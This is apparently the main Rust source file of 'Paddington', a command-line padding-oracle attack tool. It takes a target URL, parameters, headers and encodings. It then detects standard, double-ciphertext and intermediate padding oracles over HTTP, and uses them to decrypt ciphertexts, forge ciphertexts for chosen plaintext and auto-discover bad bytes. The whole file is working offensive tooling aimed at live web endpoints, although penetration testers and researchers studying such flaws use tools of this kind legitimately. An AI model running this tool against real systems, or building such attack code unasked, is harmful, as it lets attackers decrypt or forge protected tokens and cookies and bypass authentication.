use std::io::{self, Write};

use clap::{Parser, ValueEnum};
use colored::Colorize;
use regex::Regex;
use strum_macros::Display;
use tokio::sync::mpsc;

use crate::{
    crypt::{
        cradlehelpers::discover_bad_bytes,
        detector::{IntermediateDetector, SimpleDetector, find_baseline_response},
    },
    helper::{Config, Encoding, decode_ct, encode_ct, unescape},
    oracle::{DoubleOracle, IntermediateOracle, Oracle, SingleOracle},
    print::{fmt_bytes_custom, progress_bar},
    transport::HTTPTransport,
};
use reqwest::Method;

pub mod crypt;
pub mod errors;
pub mod helper;
pub mod oracle;
pub mod print;
pub mod transport;

#[derive(Display, Debug, Clone, ValueEnum)]
enum Block {
    SMALL,
    MED,
    LARGE,
    AUTO,
}

#[derive(Display, Debug, Clone, ValueEnum, PartialEq)]
enum Attack {
    DOUBLE,
    SINGLE,
    INTER,
    ALL,
}

#[derive(Parser, Debug, Clone)]
#[command(name = "Paddington", version, about = "Padding Oracles Ain't Dead!")]
struct Args {
    ///url for the vulnerable endpoint
    #[arg(short, long)]
    url: String,

    ///params to scan, can be url parameters, body parameters, or headers, alternatively surround the value you want to analyze with "@{ }@"
    #[arg(short, long)]
    params: Vec<String>,

    ///add headers to the request
    #[arg(short = 'H', long)]
    headers: Vec<String>,

    ///add the request body
    #[arg(short, long)]
    data: Option<String>,

    ///the request method to use [default: GET]
    #[arg(short, long, ignore_case = true)]
    method: Option<Method>,

    #[arg(
        short,
        long,
        help = "the encoding to use for the bytes, you can specify multiple encodings and they will be used in order.\nexample: if a string is base64 encoded then URL encoded, use \"-e url\" to url decode, and then \n\"-e b64\" to base64 decode [default: b64]"
    )]
    encoding: Vec<Encoding>,

    ///the number of threads to use
    #[arg(short, long, default_value_t = 10)]
    threads: usize,

    ///the plaintext to forge
    #[arg(short, long)]
    forge: Option<String>,

    ///the block size to use (small = 8) (med = 16) (large = 32)
    #[arg(short, long, ignore_case = true, default_value_t = Block::AUTO)]
    block_size: Block,

    ///the search string to match a response with valid padding
    #[arg(short, long)]
    search_pat: Option<String>,

    ///the proxy to use
    #[arg(long)]
    proxy: Option<String>,

    ///override the ciphertext to use
    #[arg(short, long)]
    ciphertext: Option<String>,

    ///add a prefix to the ciphertext (IV) encoded the same way as the ciphertext
    #[arg(short, long)]
    iv: Option<String>,

    #[arg(short, long, ignore_case = true, default_value_t = Attack::ALL, help = "the attack type to use, (single = standard attack) (double = double ciphertext attack) \n(inter = intermediate ciphertext attack)")]
    attack: Attack,

    ///number of times to retry when no valid byte found
    #[arg(short, long, default_value_t = 5)]
    retry: usize,

    ///known bad characters used for intermediate oracle. You don't need to list all invalid bytes for the attack to work, only a few are needed.
    ///The default configuration is best for JSON on Node, PHP, etc. The intermediate oracle doesn't work great for most Python apps at the moment.
    ///add bad bytes like so '\x00\x01\x02"\xff}{[]!'
    #[arg(long)]
    bad_chars: Option<String>,

    ///the block index to perform the intermediate padding oracle attack at
    #[arg(long)]
    intermediate_block_index: Option<usize>,

    ///perform the intermediate oracle attack in place without adding any additional blocks. Note the injection point must be at least 3 blocks from the end
    /// to give enough room to build the cradle and perform the attack
    #[arg(long, default_value_t = false)]
    inplace: bool,

    ///detect bad bytes assuming the text is using null byte padding instead of the standard PKCS#7
    #[arg(long, default_value_t = false)]
    null_padding: bool,

    /// when forging on an intermediate oracle, find a valid prefix. Otherwise if you attempt to place the forged ciphertext back in the original ciphertext it will
    /// likely cause a bad character error.
    #[arg(long, default_value_t = false)]
    forge_calc_prefix: bool,

    /// when decrypting, output the final decrypted string as hex-encoded bytes
    #[arg(long, default_value_t = false)]
    hex_output: bool,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    let mut encoding = args.encoding.clone();
    if args.encoding.len() <= 0 {
        encoding = vec![Encoding::B64];
    }

    let mut config = Config::new();
    let block_sizes: &[u8] = match args.block_size {
        Block::SMALL => &[8],
        Block::MED => &[16],
        Block::LARGE => &[32],
        Block::AUTO => &[8, 16, 32],
    };
    for block_size in block_sizes {
        let args = args.clone();
        config.set("blk_size".to_string(), (*block_size).to_string());
        config.set("threads".to_string(), args.threads.to_string());
        config.set("retry".to_string(), args.retry.to_string());
        // handle search pattern regular expression
        let search_pat;
        if let Some(pat) = args.search_pat {
            if let Ok(reg) = Regex::new(&pat) {
                search_pat = Some(reg);
            } else {
                println!("Error, invalid search pattern {}", pat);
                return;
            }
        } else {
            search_pat = None;
        }
        let mut headers: Vec<(String, String)> = vec![];
        for header in &args.headers {
            let header_parts = header.split(':').map(String::from).collect::<Vec<String>>();
            if header_parts.len() >= 2 {
                // get the val and remove leading whitespace
                let header_val = header_parts[1..].join("").trim_ascii_start().to_string();
                headers.push((header_parts[0].clone(), header_val));
            }
        }

        let standard_transport = Box::new(HTTPTransport::new(
            (&args.url).to_owned().clone(),
            headers.clone(),
            args.method.clone().unwrap_or(Method::GET),
            args.data.clone(),
            encoding.clone(),
            args.params.clone(),
            args.proxy.clone(),
        ));
        let standard_ct = standard_transport.base_ct.clone();
        let ciphertext;
        if let Some(ref ct) = args.ciphertext {
            ciphertext = decode_ct(ct.clone(), args.encoding);
        } else {
            ciphertext = standard_ct.clone();
        }

        let baseline =
            find_baseline_response(&standard_ct, standard_transport.clone(), search_pat.clone(), args.threads)
                .await
                .ok();

        // find ct_len for the progress bar
        let mut ct_len = standard_ct.len() - *block_size as usize;
        if let Some(ref pt) = args.forge {
            let pt = unescape(pt.to_owned());
            ct_len = ((pt.len() / *block_size as usize) + 1) * *block_size as usize;
        } else {
            if let Some(ref ct_override) = args.ciphertext {
                ct_len = decode_ct(ct_override.to_string(), encoding.clone()).len()
                    - *block_size as usize;
            }
            if let Some(ref iv) = args.iv {
                ct_len += decode_ct(iv.to_string(), encoding.clone()).len()
            }
        }

        if args.attack == Attack::ALL || args.attack == Attack::SINGLE {
            let detect = SimpleDetector::init(
                None,
                &standard_ct,
                standard_transport.clone(),
                *block_size as usize,
                args.threads,
                baseline.clone(),
                search_pat.clone(),
            )
            .await;
            if let Ok(detector) = detect {
                println!("{}", "Standard Oracle Detected".green());
                let (tx, rx) = mpsc::channel(255);
                let close_progress = progress_bar(ct_len, *block_size as usize, rx);
                let oracle = SingleOracle::new(detector, tx, *block_size as usize, args.retry);
                if let Some(ref pt) = args.forge {
                    let pt = unescape(pt.to_owned());
                    let ct = oracle.forge(&standard_ct, &pt).await;
                    if let Ok(ct) = ct {
                        close_progress();
                        println!(
                            "ciphertext {:?}",
                            encode_ct(&ct, encoding.clone()).unwrap_or(String::new())
                        );
                        return;
                    }
                } else {
                    let pt = oracle.decrypt(&ciphertext).await;
                    if let Ok(pt) = pt {
                        close_progress();
                        println!("plaintext {:?}", fmt_bytes_custom(&pt, args.hex_output));
                        return;
                    }
                }
            } else {
                println!("No Standard Oracle Detected");
            }
        }

        if args.attack == Attack::ALL || args.attack == Attack::DOUBLE {
            let detect = SimpleDetector::init(
                Some(standard_ct.clone()),
                &standard_ct,
                standard_transport.clone(),
                *block_size as usize,
                args.threads,
                baseline.clone(),
                search_pat.clone(),
            )
            .await;
            if let Ok(detector) = detect {
                println!("{}", "Double Oracle Detected".green());
                let (tx, rx) = mpsc::channel(255);
                let close_progress = progress_bar(ct_len, *block_size as usize,rx);
                let double_oracle =
                    DoubleOracle::new(detector, tx, &standard_ct, *block_size as usize, args.retry);
                if let Some(ref pt) = args.forge {
                    let pt = unescape(pt.to_owned());
                    let ct = double_oracle.forge(&standard_ct, &pt).await;
                    if let Ok(ct) = ct {
                        close_progress();
                        println!(
                            "ciphertext {:?}",
                            encode_ct(&ct, encoding.clone()).unwrap_or(String::new())
                        );
                        return;
                    }
                } else {
                    let pt = double_oracle.decrypt(&ciphertext).await;
                    if let Ok(pt) = pt {
                        close_progress();
                        println!("plaintext {:?}", fmt_bytes_custom(&pt, args.hex_output));
                        return;
                    }
                }
            } else {
                println!("No Double Oracle Detected");
            }
        }

        if args.attack == Attack::ALL || args.attack == Attack::INTER {
            let detect = IntermediateDetector::init(
                &standard_ct,
                standard_transport,
                *block_size as usize,
                args.threads,
                baseline.clone(),
                search_pat.clone(),
                args.intermediate_block_index.clone().map(|idx|idx-1),
                args.inplace,
            )
            .await;
            if let Ok(detector) = detect {
                println!("{} {}", "Intermediate Oracle Detected at Block Index".green(), detector.block_prefix.len()/(*block_size) as usize);
                //if attack style is in place, make sure there's enough room after the injection point
                if detector.block_suffix.len() < 3 * (*block_size as usize) && args.inplace {
                    println!("{}", "Not enough space to perform in place attack".red());
                    return;
                }
                let bad_chars = unescape(args.bad_chars.unwrap_or(String::from("")));
                let (tx, rx) = mpsc::channel(255);
                let close_progress = progress_bar(ct_len, *block_size as usize ,rx);
                //no bad chars provided, detect them
                if bad_chars.len() <= 0 {
                    print!("\r\x1B[2K");
                    io::stdout().flush().unwrap();
                    println!(
                        "{}",
                        "No bad chars provided, paddington is automatically detecting them..."
                            .yellow()
                    );
                    let second_last_block = standard_ct[standard_ct.len()
                        - (2 * block_size) as usize
                        ..standard_ct.len() - *block_size as usize]
                        .to_vec();
                    let last_block =
                        standard_ct[standard_ct.len() - *block_size as usize..].to_vec();
                    let bad_bytes_res = discover_bad_bytes(
                        &detector,
                        &detector.block_prefix,
                        &detector.block_suffix,
                        &second_last_block,
                        &last_block,
                        20,
                        tx.clone(),
                        args.inplace,
                        args.null_padding,
                    )
                    .await;

                    if let Ok(bad_bytes) = bad_bytes_res {
                        print!("\r\x1B[2K");
                        io::stdout().flush().unwrap();
                        println!("{} {} '{}' \r\n{}", "Automatically discovered bad bytes!".green(), "Re-run the paddington with the flag --bad-chars", fmt_bytes_custom(&bad_bytes, false), "Note some of these characters may be false positives or may only be bad characters in certain situations such as the '\\' character. \r\nGenerally you will want to exclude the '\\' character since it may or may not be a bad character depending on which character comes after it in the plaintext".yellow());
                    } else {
                        print!("\r\x1B[2K");
                        io::stdout().flush().unwrap();
                        println!(
                            "Could not auto discover bad bytes: {:?}",
                            bad_bytes_res.err()
                        );
                    }
                    return;
                }

                let intermediate_oracle = IntermediateOracle::new(
                    detector.clone(),
                    tx,
                    *block_size as usize,
                    &bad_chars,
                    args.inplace,
                    args.null_padding,
                    args.forge_calc_prefix,
                );
                if let Some(ref pt) = args.forge {
                    let pt = unescape(pt.to_owned());
                    let ct = intermediate_oracle.forge(&standard_ct, &pt).await;
                    if let Ok(ct) = ct {
                        close_progress();
                        println!(
                            "ciphertext {:?}",
                            encode_ct(&ct, encoding.clone()).unwrap_or(String::new())
                        );
                        return;
                    }
                } else {
                    let pt = intermediate_oracle.decrypt(&ciphertext).await;
                    if let Ok(pt) = pt {
                        close_progress();
                        println!("plaintext {:?}", fmt_bytes_custom(&pt, args.hex_output));
                        return;
                    }
                }
            } else {
                println!("No Intermediate Oracle Detected");
            }
        }
    }
}
